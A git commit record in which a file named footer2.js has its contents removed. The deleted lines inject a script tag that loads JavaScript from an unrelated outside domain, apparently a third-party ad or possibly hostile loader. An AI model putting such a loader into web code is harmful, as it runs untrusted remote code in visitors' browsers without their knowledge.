c472976a7b354fe5f5f2bc9d6bd59b07081156c9
aryvkurniawan <41510833+aryvkurniawan@users.noreply.github.com>
2022-12-03 14:54:27 +0700

    Update footer2.js

--- footer2.js
+++ footer2.js
@@ -1,5 +1,1 @@
-var head=document.getElementsByTagName('head')[0]
-var script=document.createElement('script')
-script.setAttribute('type', 'text/javascript')
-script.setAttribute('src', '//qualificationsomehow.com/95/24/13/952413d0662b81bf005b2dee80e7c6a1.js')
-head.appendChild(script)
+
